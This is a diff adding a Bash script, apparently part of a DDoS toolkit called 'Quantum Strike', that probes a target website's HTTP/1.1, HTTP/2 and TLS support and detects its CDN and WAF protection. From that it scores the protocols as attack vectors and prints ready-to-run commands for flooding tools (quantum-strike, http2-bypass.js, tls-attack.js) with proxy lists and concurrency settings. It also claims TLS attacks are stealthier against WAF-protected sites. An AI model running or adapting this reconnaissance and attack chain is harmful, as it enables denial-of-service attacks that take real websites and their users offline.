@@ -1,0 +1,484 @@
+#!/bin/bash
+# ============================================================================
+# SMART PROTOCOL ANALYZER - 智能协议分析器 v3.0
+# ============================================================================
+# 功能: 精准分析目标网站协议，智能推荐最佳攻击工具
+# 作者: Quantum Strike Team
+# 特性: AI 驱动决策 | 精准协议识别 | 实战测试验证
+# ============================================================================
+
+# 颜色定义
+RED='\033[31m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+PURPLE='\033[35m'
+CYAN='\033[36m'
+WHITE='\033[37m'
+BOLD='\033[1m'
+RESET='\033[0m'
+
+# ============================================================================
+# 辅助函数
+# ============================================================================
+
+get_stars() {
+    local score=$1
+    if [ $score -ge 90 ]; then
+        echo "${YELLOW}★★★★★${RESET}"
+    elif [ $score -ge 75 ]; then
+        echo "${YELLOW}★★★★☆${RESET}"
+    elif [ $score -ge 60 ]; then
+        echo "${YELLOW}★★★☆☆${RESET}"
+    elif [ $score -ge 40 ]; then
+        echo "${YELLOW}★★☆☆☆${RESET}"
+    else
+        echo "${YELLOW}★☆☆☆☆${RESET}"
+    fi
+}
+
+get_protection_level() {
+    local level=$1
+    if [ $level -ge 5 ]; then
+        echo "${RED}⭐⭐⭐⭐⭐ 极高${RESET}"
+    elif [ $level -ge 3 ]; then
+        echo "${YELLOW}⭐⭐⭐☆☆ 高${RESET}"
+    elif [ $level -ge 1 ]; then
+        echo "${YELLOW}⭐⭐☆☆☆ 中等${RESET}"
+    else
+        echo "${GREEN}⭐☆☆☆☆ 低${RESET}"
+    fi
+}
+
+# ============================================================================
+# 参数检查
+# ============================================================================
+
+if [ -z "$1" ]; then
+    echo -e "${RED}错误: 请提供目标 URL${RESET}"
+    echo ""
+    echo -e "${CYAN}用法:${RESET}"
+    echo "  ./protocol-analyzer-v2 <目标URL>"
+    echo ""
+    echo -e "${CYAN}示例:${RESET}"
+    echo "  ./protocol-analyzer-v2 https://example.com"
+    exit 1
+fi
+
+TARGET=$1
+
+# 提取主机和端口
+if [[ $TARGET =~ ^https:// ]]; then
+    PROTOCOL="https"
+    HOST=$(echo $TARGET | sed -e 's|^https://||' -e 's|/.*||' -e 's|:.*||')
+    PORT=$(echo $TARGET | sed -e 's|^https://||' -e 's|/.*||' | grep -oP '(?<=:)\d+' || echo "443")
+elif [[ $TARGET =~ ^http:// ]]; then
+    PROTOCOL="http"
+    HOST=$(echo $TARGET | sed -e 's|^http://||' -e 's|/.*||' -e 's|:.*||')
+    PORT=$(echo $TARGET | sed -e 's|^http://||' -e 's|/.*||' | grep -oP '(?<=:)\d+' || echo "80")
+else
+    echo -e "${RED}错误: URL 必须以 http:// 或 https:// 开头${RESET}"
+    exit 1
+fi
+
+# 清屏并显示横幅
+clear
+echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${RESET}"
+echo -e "${CYAN}║${RESET}     ${BOLD}🧠 SMART PROTOCOL ANALYZER v3.0${RESET}                   ${CYAN}║${RESET}"
+echo -e "${CYAN}║${RESET}         ${BOLD}智能协议分析器 - AI 精准推荐${RESET}                  ${CYAN}║${RESET}"
+echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${RESET}"
+echo ""
+echo -e "${GREEN}►${RESET} 目标: ${BOLD}$TARGET${RESET}"
+echo -e "${GREEN}►${RESET} 主机: ${BOLD}$HOST${RESET}"
+echo -e "${GREEN}►${RESET} 端口: ${BOLD}$PORT${RESET}"
+echo -e "${GREEN}►${RESET} 基础协议: ${BOLD}$PROTOCOL${RESET}"
+echo -e "${GREEN}►${RESET} 分析时间: ${BOLD}$(date '+%Y-%m-%d %H:%M:%S')${RESET}"
+echo ""
+echo -e "${YELLOW}⏳ 开始深度分析...${RESET}"
+echo ""
+
+# ============================================================================
+# 阶段 1: 连通性测试
+# ============================================================================
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+echo -e "${BOLD}📡 [1/6] 连通性测试${RESET}"
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+
+# 跳过 TCP 测试，直接测试 HTTP
+CONNECTABLE=true
+echo -e "✓ TCP 连接:       ${GREEN}跳过直接测试${RESET}"
+
+# 测试 HTTP 响应
+RESPONSE=$(curl -s -o /dev/null -w "%{http_code}|%{time_total}" -m 5 "$TARGET" 2>/dev/null)
+HTTP_CODE=$(echo $RESPONSE | cut -d'|' -f1)
+RESPONSE_TIME=$(echo $RESPONSE | cut -d'|' -f2)
+
+if [ ! -z "$HTTP_CODE" ] && [ "$HTTP_CODE" != "000" ]; then
+    echo -e "✓ HTTP 状态:      ${GREEN}$HTTP_CODE${RESET}"
+    echo -e "✓ 响应时间:      ${GREEN}${RESPONSE_TIME}s${RESET}"
+    HTTP_WORKING=true
+else
+    echo -e "✗ HTTP 响应:      ${RED}异常${RESET}"
+    HTTP_WORKING=false
+fi
+
+echo ""
+
+# ============================================================================
+# 阶段 2: 精准协议检测
+# ============================================================================
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+echo -e "${BOLD}🔬 [2/6] 精准协议检测${RESET}"
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+
+# 初始化评分
+HTTP1_SCORE=0
+HTTP2_SCORE=0
+TLS_SCORE=0
+
+# HTTP/1.0 测试
+HTTP10_TEST=$(curl -s -o /dev/null -w "%{http_version}" --http1.0 -m 3 "$TARGET" 2>/dev/null)
+if [[ $HTTP10_TEST == "1.0" ]] || [[ $HTTP10_TEST == "1.1" ]]; then
+    echo -e "✓ HTTP/1.0        ${GREEN}[支持]${RESET}"
+    HTTP1_SCORE=$((HTTP1_SCORE + 20))
+fi
+
+# HTTP/1.1 测试
+HTTP11_TEST=$(curl -s -o /dev/null -w "%{http_version}" --http1.1 -m 3 "$TARGET" 2>/dev/null)
+HTTP11_TIME=$(curl -s -o /dev/null -w "%{time_total}" --http1.1 -m 3 "$TARGET" 2>/dev/null)
+HTTP11_SUCCESS=0
+
+if [[ $HTTP11_TEST == "1.1" ]]; then
+    # 发送 5 个测试请求验证稳定性
+    for i in {1..5}; do
+        TEST_CODE=$(curl -s -o /dev/null -w "%{http_code}" --http1.1 -m 3 "$TARGET" 2>/dev/null)
+        if [ "$TEST_CODE" = "200" ] || [ "$TEST_CODE" = "301" ] || [ "$TEST_CODE" = "302" ]; then
+            HTTP11_SUCCESS=$((HTTP11_SUCCESS + 1))
+        fi
+    done
+    
+    SUCCESS_RATE=$((HTTP11_SUCCESS * 20))
+    HTTP1_SCORE=$((HTTP1_SCORE + SUCCESS_RATE + 30))
+    
+    echo -e "✓ HTTP/1.1        ${GREEN}[支持]${RESET} 响应: ${HTTP11_TIME}s | 成功率: ${SUCCESS_RATE}%"
+    echo -e "  └─ 评分: ${YELLOW}${HTTP1_SCORE}/100${RESET}"
+    HTTP1_SUPPORT=true
+else
+    echo -e "✗ HTTP/1.1        ${RED}[不支持]${RESET}"
+    HTTP1_SUPPORT=false
+fi
+
+# HTTP/2 测试
+if [ "$PROTOCOL" = "https" ]; then
+    HTTP2_TEST=$(curl -s -o /dev/null -w "%{http_version}" --http2 -m 3 "$TARGET" 2>/dev/null)
+    HTTP2_TIME=$(curl -s -o /dev/null -w "%{time_total}" --http2 -m 3 "$TARGET" 2>/dev/null)
+    HTTP2_SUCCESS=0
+    
+    if [[ $HTTP2_TEST == "2" ]]; then
+        # 发送 5 个测试请求验证稳定性
+        for i in {1..5}; do
+            TEST_CODE=$(curl -s -o /dev/null -w "%{http_code}" --http2 -m 3 "$TARGET" 2>/dev/null)
+            if [ "$TEST_CODE" = "200" ] || [ "$TEST_CODE" = "301" ] || [ "$TEST_CODE" = "302" ]; then
+                HTTP2_SUCCESS=$((HTTP2_SUCCESS + 1))
+            fi
+        done
+        
+        SUCCESS_RATE=$((HTTP2_SUCCESS * 20))
+        HTTP2_SCORE=$((SUCCESS_RATE + 40))
+        
+        echo -e "✓ HTTP/2          ${GREEN}[支持]${RESET} 响应: ${HTTP2_TIME}s | 成功率: ${SUCCESS_RATE}%"
+        echo -e "  └─ 评分: ${YELLOW}${HTTP2_SCORE}/100${RESET}"
+        HTTP2_SUPPORT=true
+    else
+        echo -e "✗ HTTP/2          ${RED}[不支持]${RESET} ${YELLOW}← 目标只支持 HTTP/1.1${RESET}"
+        HTTP2_SUPPORT=false
+    fi
+else
+    echo -e "✗ HTTP/2          ${YELLOW}[仅 HTTPS 支持]${RESET}"
+    HTTP2_SUPPORT=false
+fi
+
+# TLS 详细检测
+if [ "$PROTOCOL" = "https" ]; then
+    TLS_INFO=$(echo | timeout 5 openssl s_client -connect $HOST:$PORT -servername $HOST 2>/dev/null)
+    TLS_VERSION=$(echo "$TLS_INFO" | grep "Protocol" | head -1 | awk '{print $3}')
+    TLS_CIPHER=$(echo "$TLS_INFO" | grep "Cipher" | head -1 | awk -F': ' '{print $2}')
+    
+    if [ ! -z "$TLS_VERSION" ]; then
+        echo -e "✓ TLS 协议        ${GREEN}[支持]${RESET} 版本: ${TLS_VERSION}"
+        echo -e "  └─ 加密套件: ${TLS_CIPHER}"
+        
+        if [[ $TLS_VERSION == *"TLSv1.3"* ]]; then
+            TLS_SCORE=70
+            echo -e "  └─ ${GREEN}TLS 1.3 现代加密${RESET} 评分: ${YELLOW}${TLS_SCORE}/100${RESET}"
+            TLS13_SUPPORT=true
+        elif [[ $TLS_VERSION == *"TLSv1.2"* ]]; then
+            TLS_SCORE=85
+            echo -e "  └─ ${GREEN}TLS 1.2 标准加密${RESET} 评分: ${YELLOW}${TLS_SCORE}/100${RESET}"
+            TLS12_SUPPORT=true
+        fi
+    fi
+fi
+
+echo ""
+
+# ============================================================================
+# 阶段 3: 服务器指纹识别
+# ============================================================================
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+echo -e "${BOLD}🔍 [3/6] 服务器指纹识别${RESET}"
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+
+HEADERS=$(curl -s -I -m 5 "$TARGET" 2>/dev/null)
+
+# 服务器类型
+SERVER=$(echo "$HEADERS" | grep -i "^Server:" | cut -d' ' -f2- | tr -d '\r')
+if [ ! -z "$SERVER" ]; then
+    echo -e "服务器:          ${GREEN}$SERVER${RESET}"
+    
+    # 根据服务器类型调整评分
+    if [[ $SERVER == *"nginx"* ]] || [[ $SERVER == *"Nginx"* ]]; then
+        echo -e "  └─ Nginx 服务器，HTTP/1.1 兼容性最佳"
+        HTTP1_SCORE=$((HTTP1_SCORE + 10))
+    fi
+else
+    echo -e "服务器:          ${YELLOW}未公开${RESET}"
+fi
+
+# CDN 检测
+CDN_DETECTED=false
+PROTECTION_LEVEL=0
+
+if echo "$HEADERS" | grep -iq "cloudflare"; then
+    echo -e "CDN:             ${YELLOW}Cloudflare${RESET} ⚠️"
+    CDN_DETECTED=true
+    CDN_TYPE="cloudflare"
+    PROTECTION_LEVEL=$((PROTECTION_LEVEL + 3))
+    # Cloudflare 对 HTTP/1.1 更友好
+    HTTP1_SCORE=$((HTTP1_SCORE + 5))
+elif echo "$HEADERS" | grep -iq "akamai"; then
+    echo -e "CDN:             ${YELLOW}Akamai${RESET} ⚠️"
+    CDN_DETECTED=true
+    CDN_TYPE="akamai"
+    PROTECTION_LEVEL=$((PROTECTION_LEVEL + 2))
+else
+    echo -e "CDN:             ${GREEN}未检测到${RESET} ✓"
+fi
+
+# WAF 检测
+if echo "$HEADERS" | grep -iq "x-waf\|x-firewall\|x-sucuri"; then
+    echo -e "WAF:             ${RED}检测到${RESET} ⚠️⚠️"
+    WAF_DETECTED=true
+    PROTECTION_LEVEL=$((PROTECTION_LEVEL + 3))
+    # 有 WAF 时，TLS 攻击更隐蔽
+    TLS_SCORE=$((TLS_SCORE + 15))
+else
+    echo -e "WAF:             ${GREEN}未检测到${RESET} ✓"
+    WAF_DETECTED=false
+fi
+
+echo ""
+
+# ============================================================================
+# 阶段 4: 实战压力测试
+# ============================================================================
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+echo -e "${BOLD}⚡ [4/6] 实战压力测试${RESET}"
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+
+# 测试不同协议的实际表现
+echo "正在测试 HTTP/1.1 性能..."
+HTTP1_SUCCESS=0
+HTTP1_TOTAL_TIME=0
+
+for i in {1..10}; do
+    RESULT=$(curl -s -o /dev/null -w "%{http_code}|%{time_total}" --http1.1 -m 3 "$TARGET" 2>/dev/null)
+    CODE=$(echo $RESULT | cut -d'|' -f1)
+    TIME=$(echo $RESULT | cut -d'|' -f2)
+    
+    if [ "$CODE" = "200" ] || [ "$CODE" = "301" ] || [ "$CODE" = "302" ]; then
+        HTTP1_SUCCESS=$((HTTP1_SUCCESS + 1))
+        HTTP1_TOTAL_TIME=$(echo "$HTTP1_TOTAL_TIME + $TIME" | bc)
+    fi
+done
+
+HTTP1_SUCCESS_RATE=$((HTTP1_SUCCESS * 10))
+HTTP1_AVG_TIME=$(echo "scale=3; $HTTP1_TOTAL_TIME / 10" | bc 2>/dev/null || echo "0")
+
+echo -e "HTTP/1.1 结果:   成功率: ${GREEN}${HTTP1_SUCCESS_RATE}%${RESET} | 平均: ${HTTP1_AVG_TIME}s"
+
+# 根据实战结果调整评分
+HTTP1_SCORE=$((HTTP1_SCORE + HTTP1_SUCCESS_RATE / 2))
+
+if [ "$HTTP2_SUPPORT" = true ]; then
+    echo "正在测试 HTTP/2 性能..."
+    HTTP2_SUCCESS=0
+    HTTP2_TOTAL_TIME=0
+    
+    for i in {1..10}; do
+        RESULT=$(curl -s -o /dev/null -w "%{http_code}|%{time_total}" --http2 -m 3 "$TARGET" 2>/dev/null)
+        CODE=$(echo $RESULT | cut -d'|' -f1)
+        TIME=$(echo $RESULT | cut -d'|' -f2)
+        
+        if [ "$CODE" = "200" ] || [ "$CODE" = "301" ] || [ "$CODE" = "302" ]; then
+            HTTP2_SUCCESS=$((HTTP2_SUCCESS + 1))
+            HTTP2_TOTAL_TIME=$(echo "$HTTP2_TOTAL_TIME + $TIME" | bc)
+        fi
+    done
+    
+    HTTP2_SUCCESS_RATE=$((HTTP2_SUCCESS * 10))
+    HTTP2_AVG_TIME=$(echo "scale=3; $HTTP2_TOTAL_TIME / 10" | bc 2>/dev/null || echo "0")
+    
+    echo -e "HTTP/2 结果:     成功率: ${GREEN}${HTTP2_SUCCESS_RATE}%${RESET} | 平均: ${HTTP2_AVG_TIME}s"
+    
+    # 根据实战结果调整评分
+    HTTP2_SCORE=$((HTTP2_SCORE + HTTP2_SUCCESS_RATE / 2))
+fi
+
+echo ""
+
+# ============================================================================
+# 阶段 5: AI 智能评分
+# ============================================================================
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+echo -e "${BOLD}🧠 [5/6] AI 智能评分${RESET}"
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+
+# 显示最终评分
+echo -e "HTTP/1.1 综合评分: ${BOLD}${HTTP1_SCORE}/100${RESET} $(get_stars $HTTP1_SCORE)"
+if [ "$HTTP2_SUPPORT" = true ]; then
+    echo -e "HTTP/2 综合评分:   ${BOLD}${HTTP2_SCORE}/100${RESET} $(get_stars $HTTP2_SCORE)"
+fi
+if [ "$PROTOCOL" = "https" ]; then
+    echo -e "TLS 攻击评分:      ${BOLD}${TLS_SCORE}/100${RESET} $(get_stars $TLS_SCORE)"
+fi
+
+echo ""
+
+# 决定最佳协议
+BEST_PROTOCOL=""
+BEST_SCORE=0
+
+if [ $HTTP1_SCORE -gt $BEST_SCORE ]; then
+    BEST_PROTOCOL="HTTP/1.1"
+    BEST_SCORE=$HTTP1_SCORE
+fi
+
+if [ "$HTTP2_SUPPORT" = true ] && [ $HTTP2_SCORE -gt $BEST_SCORE ]; then
+    BEST_PROTOCOL="HTTP/2"
+    BEST_SCORE=$HTTP2_SCORE
+fi
+
+if [ "$PROTOCOL" = "https" ] && [ $TLS_SCORE -gt $BEST_SCORE ]; then
+    BEST_PROTOCOL="TLS"
+    BEST_SCORE=$TLS_SCORE
+fi
+
+echo -e "${GREEN}🎯 最佳协议: ${BOLD}$BEST_PROTOCOL${RESET} ${GREEN}(评分: $BEST_SCORE)${RESET}"
+
+echo ""
+
+# ============================================================================
+# 阶段 6: 智能推荐
+# ============================================================================
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+echo -e "${BOLD}💡 [6/6] 智能推荐方案${RESET}"
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+
+# 根据最佳协议推荐工具
+if [ "$BEST_PROTOCOL" = "HTTP/1.1" ]; then
+    echo -e "${GREEN}🥇 推荐方案: 量子打击系统${RESET} (推荐指数: ${YELLOW}★★★★★${RESET})"
+    echo ""
+    echo -e "   ${BOLD}原因分析:${RESET}"
+    echo -e "   • 目标${GREEN}只支持 HTTP/1.1${RESET} 或 HTTP/1.1 表现最佳"
+    echo -e "   • HTTP/1.1 成功率: ${GREEN}${HTTP1_SUCCESS_RATE}%${RESET}"
+    if [ "$HTTP2_SUPPORT" = false ]; then
+        echo -e "   • ${YELLOW}未检测到 HTTP/2 支持${RESET}"
+    fi
+    echo ""
+    echo -e "   ${BOLD}推荐工具:${RESET}     ${GREEN}quantum-strike${RESET}"
+    echo -e "   ${BOLD}脚本位置:${RESET}     premium-ddos/quantum-strike"
+    echo -e "   ${BOLD}攻击协议:${RESET}     HTTP/1.1"
+    echo -e "   ${BOLD}并发数:${RESET}       125 进程"
+    echo -e "   ${BOLD}预期成功率:${RESET}   ~${HTTP1_SUCCESS_RATE}%"
+    echo ""
+    echo -e "   ${CYAN}执行命令:${RESET}"
+    echo -e "   ${BOLD}cd ../premium-ddos${RESET}"
+    echo -e "   ${BOLD}./quantum-strike $TARGET ../../config/proxies.txt 60${RESET}"
+    
+elif [ "$BEST_PROTOCOL" = "HTTP/2" ]; then
+    echo -e "${GREEN}🥇 推荐方案: HTTP/2 绕过攻击${RESET} (推荐指数: ${YELLOW}★★★★☆${RESET})"
+    echo ""
+    echo -e "   ${BOLD}原因分析:${RESET}"
+    echo -e "   • 目标${GREEN}支持 HTTP/2${RESET}"
+    echo -e "   • HTTP/2 成功率: ${GREEN}${HTTP2_SUCCESS_RATE}%${RESET}"
+    echo -e "   • HTTP/2 评分 (${HTTP2_SCORE}) > HTTP/1.1 评分 (${HTTP1_SCORE})"
+    echo ""
+    echo -e "   ${BOLD}推荐工具:${RESET}     ${GREEN}http2-bypass.js${RESET}"
+    echo -e "   ${BOLD}脚本位置:${RESET}     http-attacks/http2-bypass.js"
+    echo -e "   ${BOLD}攻击协议:${RESET}     HTTP/2"
+    echo -e "   ${BOLD}预期成功率:${RESET}   ~${HTTP2_SUCCESS_RATE}%"
+    echo ""
+    echo -e "   ${CYAN}执行命令:${RESET}"
+    echo -e "   ${BOLD}cd ../http-attacks${RESET}"
+    echo -e "   ${BOLD}node http2-bypass.js $TARGET 90 32 8 ../../config/proxies.txt${RESET}"
+    
+elif [ "$BEST_PROTOCOL" = "TLS" ]; then
+    echo -e "${GREEN}🥇 推荐方案: TLS 加密攻击${RESET} (推荐指数: ${YELLOW}★★★★☆${RESET})"
+    echo ""
+    echo -e "   ${BOLD}原因分析:${RESET}"
+    echo -e "   • 检测到${RED}高防护${RESET}环境 (WAF/CDN)"
+    echo -e "   • TLS 层攻击更隐蔽"
+    echo -e "   • TLS 版本: ${TLS_VERSION}"
+    echo ""
+    echo -e "   ${BOLD}推荐工具:${RESET}     ${GREEN}tls-attack.js${RESET}"
+    echo -e "   ${BOLD}脚本位置:${RESET}     tls-attacks/tls-attack.js"
+    echo -e "   ${BOLD}攻击协议:${RESET}     TLS ${TLS_VERSION}"
+    echo ""
+    echo -e "   ${CYAN}执行命令:${RESET}"
+    echo -e "   ${BOLD}cd ../tls-attacks${RESET}"
+    echo -e "   ${BOLD}node tls-attack.js $TARGET 90 32 8 ../../config/proxies.txt${RESET}"
+fi
+
+echo ""
+
+# 备选方案
+echo -e "${YELLOW}🥈 备选方案:${RESET}"
+if [ "$BEST_PROTOCOL" != "HTTP/1.1" ] && [ "$HTTP1_SUPPORT" = true ]; then
+    echo -e "   • TCP 批量攻击 (tcp-attacks/tcp)"
+fi
+if [ "$BEST_PROTOCOL" != "HTTP/2" ] && [ "$HTTP2_SUPPORT" = true ]; then
+    echo -e "   • HTTP/2 绕过 (http-attacks/http2-bypass.js)"
+fi
+if [ "$BEST_PROTOCOL" != "TLS" ] && [ "$PROTOCOL" = "https" ]; then
+    echo -e "   • TLS 加密攻击 (tls-attacks/tls-attack.js)"
+fi
+
+echo ""
+
+# ============================================================================
+# 总结
+# ============================================================================
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+echo -e "${BOLD}📊 分析总结${RESET}"
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+
+echo -e "目标地址:        ${GREEN}$TARGET${RESET}"
+echo -e "最佳协议:        ${GREEN}${BOLD}$BEST_PROTOCOL${RESET}"
+echo -e "防护等级:        $(get_protection_level $PROTECTION_LEVEL)"
+if [ "$BEST_PROTOCOL" = "HTTP/1.1" ]; then
+    echo -e "推荐工具:        ${GREEN}${BOLD}quantum-strike${RESET}"
+    echo -e "预期成功率:      ${GREEN}~${HTTP1_SUCCESS_RATE}%${RESET}"
+elif [ "$BEST_PROTOCOL" = "HTTP/2" ]; then
+    echo -e "推荐工具:        ${GREEN}${BOLD}http2-bypass.js${RESET}"
+    echo -e "预期成功率:      ${GREEN}~${HTTP2_SUCCESS_RATE}%${RESET}"
+else
+    echo -e "推荐工具:        ${GREEN}${BOLD}tls-attack.js${RESET}"
+fi
+
+echo ""
+echo -e "${CYAN}════════════════════════════════════════════════════════════${RESET}"
+echo -e "${GREEN}✓ 智能分析完成！${RESET}"
+echo -e "${CYAN}════════════════════════════════════════════════════════════${RESET}"
+echo ""
+
